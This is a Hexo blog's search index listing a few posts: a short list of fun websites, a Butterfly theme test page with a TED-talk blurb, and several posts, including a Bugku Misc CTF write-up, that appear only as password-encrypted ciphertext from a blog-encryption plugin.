<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>有趣的网站分享</title>
      <link href="/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/"/>
      <url>/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="有趣网站指南"><a href="#有趣网站指南" class="headerlink" title="有趣网站指南"></a>有趣网站指南</h1><h2 id="编程相关"><a href="#编程相关" class="headerlink" title="编程相关"></a>编程相关</h2><ul><li>每一个程序员都应该知道的网站：<a href="https://github.com">https://github.com</a></li><li></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 有趣的网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku Misc题解</title>
      <link href="/2022/11/21/Bugku-Misc%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/11/21/Bugku-Misc%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b2c125734df563f20b3b250a2b26061ac61cdf240411d61cf1fe105b4e7baa00">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f78380d04f1940ddb6d0b9487c2ecfb925885fe12d6e51b1c9d76a89e97c30f4be414966f2537af82a73c32cdccea3cc217e138f07e383b5d894a47fc3e41505c5d3199a0383148469310eab83d8d311a793e11871453f062214b7ec7459c8e693fb6e48cc2751cf9c1c8423ebec9d58bc7afe2e6927f304422296270ab9668161</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> BugkuMisc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Test-topBanner&amp;&amp;参数释义</title>
      <link href="/2022/11/21/Test-topBanner/"/>
      <url>/2022/11/21/Test-topBanner/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Test-swiper-index</title>
      <link href="/2022/11/21/Test-swiper-index/"/>
      <url>/2022/11/21/Test-swiper-index/</url>
      
        <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Butterfly主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first-page</title>
      <link href="/2022/11/19/first-page/"/>
      <url>/2022/11/19/first-page/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="64d4ff5441eeeaedad0c7bdaef13cff2576367ee5c279c0893827ea455cdb755">4a6507354cb78ecc1824dc9c9dc549d03978357026218941c97ad64778cd22eb2c0f3681bc07b79085d69e5851c0819e6fae7d5f4defbc457ae4588ad26c8e77c37ee017bc92969d027bf2f9cf5ce6c4e4b8e8f79f647ef5d80223530d1729392608d1345a3322d926cf3f2bf164be5fc994a81ac0cd9ae56e0ce26fb09fc2b14ba63440545be3426d1d2205d22ef9c3394236aa46ee0e5d2354e13af466c87adabe9b5986113993674d8c47a968c0febc8345343457583998e415256057447e84886693da99f509bc7045016fac737123288468a7b40a9df03c0172432ee9cde3676c78f943b582aa29fc1f1301a06e63598f1de74bab81e36f07cdb5a92c57a83fbb42361b68614be33a424fee909b07957af19dd85b151b5bd0cfd0a490dbe032fe810c2af441160c6d6d975fb1635ab7603097255a283f28815e6da3c42ddc20c5384b591cdf9d3bceedd02d080c37dcdefec66f33a82faff7ee22650d9e921b7e988f71e2090619419181ac7e21acfc962c821bd6458e263725b03ccd55cb251099471d97ff3369b6e0f767241d5c1feea24ef59b6615f3a3959ac864981abfad0680c555da3054c9b6b56e03611addfaa0272db53b3e41beb0743289883c8814d68bb26c91c4653aeddc7a6eb3f16c8c4bb44a6ff351f149072c67c3b3a307f2fe73134b6049ad7408da06c6f06534ead541869cefdb6d3a99381ada3148ec6055c1c06b5c7d73cd3cdfb9a1d1617a3de5b6411c9f7909dc3fd523374f201284d203203f041c8b0f3b175f067087a17d9ced922fe5e458569c96d4e6fbf671dc17d9005fc880955eca4cbb17c592391ea51a70600c1c49659bf30f61bd8475e5afadee1165ab6bf0f2f566c931c351af38040ee9adb2da3cdf6887f0fee3c5321282033b748134601c0f256d9966501768c7a803025f25be3a5cb4f9504bc04f8dd0f15f775c66c31bdbf07efa4549ab82ca1c1cb1ccbee52a05eeff5da5c24ae55dd781983831a91ace0217f82baa51b31c6d41e429fb32fa6b5509878947c473baf1f8fadf1dbe4caf1455b082df1c6507003a572fcb57e95b54bc133d23a712fb762ebcb71fc2878c9b9b2f2219d9fbfc9d7cc3195e379c037f7e0736853df24378e3eff70c4b7449bd5c3c4b92fc169346f345518b7fc2442c7527c33e7cc2aecd971f8ba3db4a5eda70077ccb5c70e8b09bb7ea6c7e7fc2b5e30829f408fd0e287bea5fafdd5fffd9571911f24f4cbede64b072b1a237be6781822f2ff5ad8c1178d292d6dbb9e282959e92b6ac28e67bb3545b58cf4c8f3f634a0bcf498f5bbce5c08390af07a3a1c9370cb3cc3b4be644ab893b510d00ed87ef78914959e5d83af11aa626575019fd07eae6b8a524311936bf0fda11407aa4400701a2ccbc3fbbc6fa1c9ce917a750d28a37e9ada0ffbedddbc1ed9943eba435d8d106291bdd225b7d2dc0b8cac57a049f916546908838ae1199c0546b22516be7dd79d1876479416dcdf87a31a9ca068a0810882051aa3dca1a660f0e7f317387d21f8d8bd5fcfc23d18a1d197bb0529e6550ef013ee68588f099af777164c0eaab5fcb2489b4c6203a97180fbf0c80aa5e83281b0fe8881478c8b36abb6141447238881c04e9b33003ce42468620bf5a48ddb11bbd4e63dce4c0b56b39ad9fdc6912b505c496aba71a076713292dee3591950bd8bb23933af4d9768ece2f5e6c8f75d7a4e7f71384135ae133b810b608403b679e42a7166700920da2718638c05341c48479204bfb94c83fc2e997fcca52433c09046cdee6689915ab26a37f192f1cb4a752429049005220f7f610d81cb0dab5449ac587e127776c87e00e308e96b07d70dbde4d135d8df548878ed5ed0ec8bfcdba82030df8166bf8d687419dcb2e7ee83e7360c0ad737809bc6e5b4ad8c08aac3c22e2454d3eb19b79940f0ccbee489218f4121b6e234fe5d308088de0e3c747417c7eebaa6c0d5603c0f3d7a810f7c0bacfb97acecadd42befab99d743274b0e089c4166d864187fdbaf759ed37785d75bc95efe8b458d607c939ea597abf19b83735b288f26a42cb847f7468b2277a3479b204837a5eef49d2e1002d5c07aff8a6882213f5f7a6639a93420f92fe2a866208950594fee3632c6988bf1305686040e064cfe72d8b3c8fd902b4cc68799bce1aded4b92ab10f1de94445641cc2d8b863ab931ac3f2555541709c27985c3b4bd862b10cd65f178539315015b45f2f203551b0ef271c6863ea876fb1ce1e1200efdd876cbc0bbe17c39a9979546488409f797a8936c0393a35d4cf752dec5cb62634cd7c58d91b38a7148b24afda0530b7b0fd87c0dea18efa81978b8ad4ece17c705b6190861f75f7ee42b9aded49c0e99dc16ca7eade76b1fe7b39760ea65d81d19bc3f9fafc4c827a375829fb0b6e887e531f2c0dbbe95afc47ece3396b022eb3ef19c9d419518e1f397bfda0ad03681d44f8223dfbcaf02c9995b9c6384bf5112c20087c509986ab3aaae4c3920cc05c1c285c07d4efc0b3400c2d5c3e0e7c7db35540416aa3f828881859014d752fd9268f4db628f16ad9772c92fb317e3e47569782ed421bca65262a67e90991fefe163dcf380887f9372aac470365d071a2c20735eaab2e4fff6d95f4aa46e2832fdfea78305ba477610aefadb8716bb5eefa722c304e04a19b0dc7cce4b3d3b5f363ce3c34de93cd016187e1cfd0645520949d13b9dc731afc240faefeeaddf88b20f5a5a7981fecc3f10c9f963759cdcb2d93316307dbf193ccfb6d53865b0e9bc2df0a3cde1165143e3077a90ef0b82f331889f8d13e782edc6559cf182d40a63544021a27bbeb4eafc3ddaa2ed14f2bb77e31bf6fd3fc9b33684573b440ba23fed6a954bc077bc57102f7434a83e28da6e804850c2d13dd3ae7d2a3856ebaf0c159cc391ad849c25f5cd65285b03972d8bc71fb141b4398499a314529989e0499fc840dc76110622a39c2d0d8b2be5bf7bc367f0f888c849705792f4989475c862c5bb6249c32415a88ca87989c09bf75bc2562ede58d903cb3121a9beff9339f367e1ad2519afbc2f931642436164f3cade4584c7a9a739eafc24076713ae4e1622e481beee4cb675482227302e62bba1b73e6856b8db5931320692e2feba1e30a6ea7600f6f322bdd9476db45a013d55b464e59edeedb8f05b02537cd4554512cf0e930bc4bad14565172cbc87d2e25336882765d9b2666264c3ab4b466b3dbfd98e9b96adc9c73ca9aa95dcbff6220274caaa30ce582d56a394d79bf293752d0ae33def13a6b73847c6fff494abbb147fab9171c300555601dccb0580c5c8a0855f371cf2d2e986a1710773d366b9443e3cd251bba6097554b759855b5f32a9e8a00848dae403e08042884898820117fa2730d0b86cda9d73042019224591f192dded4c86100080e53c124e0cd8e46474817810333ee8012262e63d3955354e7b68abc8cf85376a3371bcf9426da8f45f27baabf2208bd1d4a6ff476c3c844b31a3e8bb7dda4d14c37408b36d08c430aef63945f89f84d3c4e2b102e5d5b0c56e83573b13808c3e2bb63a4e13ff72507653647ee29f5dfe676bb6821cccfa67cd9f091c71d53ee1ffa00fc21ed33a9c28aee720246e9a1ad14e489999b8474e3e034558134a3cbf59ccb51f8056435fe4ba9e9a23c3e5149479c8b97004be398b8b03c17a5f1bee23c33563510ca01c2d49070fd084548358fade98381a9606a07fd3c609cdd82e76616961c5118f88ace6ca597c71c9c3da0c7e5cc300a780da11f512418727a90fa023365a9645062a2227310535f44d740d39c4afcedcdc40c2c61a249b132d6e464390600bdccd8bcffd807713d7d9c57e61972a9d5e3b87f0c81983c5cc831782f5399086cd6c0fd1919b0d2866d954b441eb0cf02a593348435a737e7fe3595089359cfaf63b102b55b7159df229487b663bcd283b22cb756828c0fec58ec1015e5423cce26503a202832fac6c843d1d2735ab5ed5bc0d2ecb584be66eb95a3f7eb3970f51c36c480137495357410968dda5ccfdc60b74b6b0627276f9adbf4a573adc98f4d1e742f0823469be03352a76e17099dd4863ae5c7c7f1f89a7586871758b45c22cf1df431b76d013cbeee916331926bba7cd48df2627052165176c68bc92607633017405506d585a92e985539c6f0a6b7f805096cff4334c44635f6326e45ddce9105b10eeda587a847fac42fb4204754af61e7e84a5a2737c93b4e99dc6c3f1ef82f4c58dab1e926ed7a2256e3454eae1c2d24b909b2cc0e3d19512fd4d481edb11ff83c108dfe401960d31df9fc0a2a520e13ab9a478e5db1c98665073f3a38a90137d2edfd8abc9a4698aaba75797c09f64d36ebcc5f4aa5b60214d2c903788900563a04c5b27e8cb4b9e04f1c99c4b988af54ea4e23ac59452393b8a0e9ecee562219f1bc44ad82d4c37806ba32922024510be3e36e74c577d7fac719c20891a7fec2f9ca03fd193800c76991226c1ea496dbc6ea94904729a070765a7ef5885fca029d2b7ee1db2b4539422523ae3daca681a962d23e29fb0a1a6ac98cf850dd0ee33d1ca929f817ff73e6e13c5c8735f26e065bfa97f5b989718782d6d3129860d3993c39cb4191848df41640fdb1d65ef80550ca213e7381b3e45bfc6781bc1759b4603be6191ae6a03a1350f499c01e3a8f4407314d706294b4006cfa551be118b7afb892acfb4d35376531bb38ecb45a6c0e3c239f296a8326d5c106f25c988cc5f46b74ff9efc16246a9a103ba9b315c52193f9d9ac5231a5c5a002b5c309fb2043d6fd15e44e04df6b4bb2ebca49425125f67cd4d52ef718fda80ac7c3bcad25d32397a60ee0f3fec12e8f60f96001139b4541c564e24a273e56b06ac4c2807df5ac16e891152ac99559bcb8c9b5254ad8c60f3c7603dd54b26e266fccd3da5998e752a3502a54c4110567808d2b97fcf77abc3e382a91a19679d43f9f8be61931a2553543d6a69a0ea3cfda6c9b71dd21abaa719a7b78d81621043e1e91219cf7859bef1ff386937cc25e54629115de797ae957dda1060d5420094cf2c31767f1c06a8f3d225c4177d5500d936bba52925f2a3a504320b02f844cd6789482a62c298888d369641fb34457eabefe3714504e769693fc34376d72514410702d216ca1fd04dca732b2584a430fc6a165c770aa01aa4a3ce1db1e86fd3e8423e29b2eadbff57f7fff0bbe4897c01c14ec29fc8a47d1f11fda6017bdd58d0218f2991b9eb735285186461f17cbcd01c15e8421954a5e593eaeb1c16de47675f5ce1597335f92314594e1d449a9dcf88bf92f70f697ab6809f196012bbea8dc5bbc1606c09ce9ab2381e38de13572d52efe7542c3ffee44d06fee97ce0acacaf472069f0721cafb5cf8bf3b53d979dc7c263b9ab84d372e4fe20352434de8fad26ccd0235b0be0cd44dad8bdef003123f5e91b911de6e37498939aa83a12fd615ca9a581518d4d62c849bcd410b4701214683a68c4c2a13f3e2974da84b3f9c086071b59d0f7e1eb0cbdd3c0b668df7fae6011bb1242b9a3660f00cdce708fefcd15e34a4ab844d71b36d50664b2177eb8ad0c85ae5363029be5ffb48ff0878949dc6833db80bfb6c21b5c5639defbf85351d0b1aef9a036925b8b188ddd523f67d3bacad9ad74fd72af5db43a827c6c4c6afa16939f307b0311d03d47a85949110694fbe9cd7f1e51724d583d78ad7ce1268c54566072390c584d04a374a1561de7cb61d9485c2581b2dfa69fbbd06fbbd38ec08defc3e288522c0d82525cb47fbeb954ae7da80ae15b4f1b0645ce859863f16fbc136b40dff57d53dc32665ed9614015272a3a4d234bdeb0c1d77b96500cce8835316cd1d7ab1ad20af7026f76904bd3d8b0e6888cdb363cd2a1bfe628da43bf05ea07aa1d6b829b7cdfbe9c5b28636b525deb9a41c8882251b314c76d8ea20be0f29aedc62ccf644c2042681273c7dc44bc325506aee82e7195f32c4f16e804a23f821b54af9a2538a16e14b8b2e8e8dd04e2bde2d293c4938234a8e6a96a3cd3fc85a95cf9c9b42ee0e9c9ba5a18b22dfffdc9226965b6459768ae4fdd3d12e0ab9a89e2a1ba95e192d07dfaa995fb42d450298c0db3f7aa5370f6e95738503a76ea9b31c5d9d1c6d030c944dd747bec003ef9755554922b94efa91e109f475a435daa440eb9d23e7a616374c63d5372e1a0b4905b3b9ac335cde456a4aa832b5df6c92f3c4605f37a935ec9eb3efb13c4f8c9f836300c903b6993451b8556f85f6571e7d245acc0d3105f1f5b432714ed1e0afc698f3090b2ad78b0ceb130353a9152b1709308416d3bc1d4097168ee32bc5d28a390ae627f699f100d46247a936f26180821f8dca8bb56881557fb54f8dcdf1023a5127740dbf151c48bd75a73437604c0f78091d29f1df45572a6b352d9a8d3232e94663f625b9cbe6f651cf2a1606d01cb4f4c0d66fe6117c2cca78ba663a15d30f0b10a7c13ef4269c104bf09801c9ca1d3bb224cecc40090730b9c9fc206494460312155904f11f783aa1a08bca7ea2f4a2446b9bd8a8f44b47f6576ba5b5f7c28f6ccd8185a53a8dd0428373704a77f5e37460c00668699e5e43d1f1352cc877152d498cdd5e011a688f03b086d441c64a9bbe18fa09fda7863c15432578da8c4c6edcb0bfbbce2e56678e3e573b306e2485689a4fa88d31c355398438aea61e329c9ff39e030b83904e8a5e01cbec39c9970e25e6fc3f8f960a85b629a55159dd1a5382e317f7b667028bcd342eb9b3055db7df622d31669f2c91e808688c74ec5d54155a315941534679e4df2d89ff75dc21758d0de2937985f3550b2411b63e9283091f2008c4da6997a675ec43cbdfdeea4faeca18d7965aff7f661d7ff6a09eb414655f68a661df7d2acd91cab3213172d25313fe0de2202640c9f0ee4baffe4c8b7d09cfc88063cc3acd279fb366338ab3cee4ca596653c6c939a7db7ec02ae7c0a54cfa81dce20200dac4535ab6ca7a957d76806025120e41af9a95330e3417f47a002461737e3668b565ceda3ed245b3c0ab081fd82ee06ffe0752854fb22dddc87f5b43e7e5a2711f48c20d977f5af3fdd1002b46e6e1924fef9c53d9e5fc33e13f75302389e5d172012e5038e05dd3899a62f0de8305ecf8ccf77475e229929dd90d5aa69348e90b46bb46c9a5744892ebd3b314a248b235b86884f59fb7c03b24462ab2ced2b108d8a0ef6cb9a93654e0b9ba4cbb0dba9e711a326ffeb5aebebefe56cbae61b429df7a51b49a7de8254df3284472d06e0e53b105568b56d4b4b64419fc6865dab0a2ec060cecd63c988e302adffb53c41c5d8138d50adc464b35d661c2f8efba8f34a9c131ec48cc18f99d90e7734a131418d909c91c77139d94779c1e68e8b601fb720527049a3a373400bd20c0100285b6a949dcb2397996a56aeadb7db79c2bc907eeb71d9dbdd31523d158b72422c09f6e4079fd23cf356a68879a1785ba7ec5b578dbd2cab0c0f90d1e474e9e4e55c5f0e9fda2c4360afce2e5c627a352cc400e84e579872dcc46229febd7173782e6598a73d6474a1d983a300df24eeb277fcc21e0b65537a64e54d0ff98a40ef29467fc46e1a5475b567e3c0b6b78a2ed729e58461eb82311931e8c7d496d7f4035ca9bb189f55a4e01c4d46ed08cb7bfe3e1f50d3eae873d89625aa7c5fb264ede221f0b9d2a58431d34023900b00db45f2ea66de15f62efc6777b23a3df358cbd3b70444450793bf9c481df5b9cdb7ae667e2d8f1b6faff9119912d9a2689372152dbf1d2fc49b72c797704bea882fe4f659bdc2376b50208e8773822d7749bc46247a72821a320fe2cc37356d9508f5b59470ce40f076d76c30f51736a8dbfe0e195de04d3de9236b531e4e37a11c0288f64f215a3740e15b22aedaef0ca013e6b1e30feb65821650d6234983edd6c23f6739d57c3d594843a376ff8567f2a425d2c322d842f677e335ccb2dfa02137e3bba6650c431b3f1165b1b6a37c7d1b91583f41fe3d07fca597b32dc71faef1d4669c430f1a0a5de14ea824ce181ff9222d98fd1c08e4cb6e757a94502649e8001183eea6bd0491fed4b0fba4f41dd473f5087c9cce8c2e8102ace93e4974be9ec9f47331ded27a8aab5eda0da80cff89eef997c8ad4eec2cd10ab34a8d5d482d53f1c5b5aa61c755853ac9be52dbdcdd2557ce7d4d8b232fb9e0fef5a534992eba5a616625d281f663bda3f00f9b57ac68adbd56929f1a2584cc58b7c9224b5155be617657706595b2a29f25e77aaa7fc3b161912a8892746e36196cdc143c2bfd281ecfda33592ebd9260c14e950c259088c88d2ef5b2bac842459f9672d31a71f61e7d90458a17256232b83052c8a8035d1c869d96f45a990eafddf3696868a2163adc17fa26090b9f4404b627ade6ee0c734f4d3f88fbde9b21a3c53d6c4851cbe329a22383ce882dc8a49a1838a0a7cb54b0dc096b55410c6edf094808be5320d4bbcd9d1545d006054bca692dcc37920aaae1653cfe24aca4b0fae4c6391395cc4e10366ea84567133ecb60ead7d33e98b8b3b5af6084eaf6fea5ad6df4e53a54f49297ac80883af9e060f4249c278c029798a2db369a65e64e578f67e27d491cf4214c2ee40affc32ce800eb5289538bf2c1387c35c2a5ffd2e526e602d6ff41d25b9a9604d0ea9f6859216ad9a40ee053fe24a19ce34cf5d81e930fc3917dfa781b28b3ec97a6fdd5127688dcabc085f286605a775c625c0155c4249ad84ca3745defe9859ed08e81c15d4373dad1591c0f287f40052ac0ac52f1d4fc6751b02bdf53cb43d6686e3f79a0d6787442b45a55f22ba0287b4aaa3f8cd83efe0873f071c4ebdef859aec0de32a52f6e2b53cff181811532ed4402bd375031d7e4fb3d976230975c3f3dbb022c46d8b74572f51410411570f43eac7248c498ce3feb80a08655161a8c3d5becbefb2e1738eabaeefe7c2777cf19fcebd123268ad09a151caffa0af52ee80ed9ec587d86527b785af3ad99cccb624f0e25f89b8b4ea81cbfa93a833324e85cfe51286f58409a351dad8e4eff28655baffbc2d0fc01620f2b05a33b11037392d1653c004b1ea4ded315c7de99c906d0910e3134bccc1311f80e4d03e9593698d00d6d92a7f932c8d28f0818d0030159172594e658c9468fdce103191ce17db973045cc01ab3d6db6a615493fc5a9d8745836d31cddebb4b75119aad9599528f2a088fff205e7595a9cbe3f454f47bac4ae593c419ee374ab5bd9a6e6b0d0e8d0aafa2711094ea7417dcb9272915932066c00079319714a440c414b6c02e1fcd87f9b01e222539588482afaeaaa2f57f7ce20938881fb0a965ee1abdb38439f7843d42c48f6f2dadcfbd380443297c67287b87d0a120ebd07508f343906d60b8a01342bdbba98e9e5024b0bb43e416fac2b781d978a77e489c4cc3c0ed9349dfa90862657caa4bbce62c8fbe935ff9ec82a1332a8a115cbf5e473625cf95bfe85b136ae2e5623f9ba4656ddc379e1e433fe66313933e9240a9beed007476cf5b8a8cf4b785b60725a03824f4cd963bf49c0c79dfe2685af2b74a3d70b0a2121ad53d3bebbabf5cfb50a1dbefb30b6041edd8243c611460b964dbecd03bf8ca3d74057c8bf52a46240a9e086e30a374b07e5bff7a5d78b5e34dc9f60e80209e25905901811233673e472e390b85d34ae8e3d0a23b557191450fcc23609aacfe5d5f3fea324f00325626a14076ad2e918d673a18361fa080be15e1c0ec3eef9e7d03001de41ca524636882b3a0d97ad9a9935344d1b1585a54398a5eb60bbd2097b21a944ff8b9bcbcfc03cc3a99f611cc5f34d1ecb597d11843ade38e3c136482d201cd655cce9c4485fb530acba134a26460ae8cc25ecdc2e94e593625a823f42c96b876fa6aee0b9e5a7e698ffa17f2e86ad54526aa920f9f5c81287e77d78344a609447743cfca440f8c29397aa94495184a95d7bf32314c0d06cd33c7740e8e0c2eedded2de5ab72e7670c902dcd380176debce6908abc7abc156211863ee99c970883a3c3e64ba98286097add9602c394031d17169f93b9941ac503011b30241b52ad4e95ee87e151058e3a445d02bbe4df0cd570f8c318836b88af1f774c01cd1f22a2175ab102d120ee4cf359bc3f95bf05842ec5fd42fb9c5d3b6b9c0241c417c03eba7d75791bc3f5281351745b2a3035267f23bc31bd8e07c01808fcc59578aaea3aee06de3bb1771a0c609bee721478fbefcc001fd836d56b5933ba8d9870be0e0e15560e0534ca4b5a5724d55fcbf3e4912d89c01de244a1ae7a1854757cfb13959db5ea2a5f2c0e3fc98be1fd580ed98776a942b996f8196a699410b6f69b03cfa8f7462253b6ddf27d0d3fa89862d95e5da8d40a5a6a80b075f2dde0acd07dbe11ff398ca652fdea15f0a39526edbb9bff09a7357573a1b2a3db1ba9ce3437416ce27cb58eb6528d31455516c59a327476cca48a23197979a6cf796a7c328dc8fdbc4ea8822d7edd64331b64a6b67bbe22d2184910befe4a0b10656f68a73b8428cb00698c7ac2b797dfe38dc7f84ad6e16f62fba2e6ffb4d138fcdf589d3708b1dbce5e209f570a1b7e39ad09386bd33df5a776cf3be33841d057e6bdd8aaceff79239f1de7705c790e298f237c4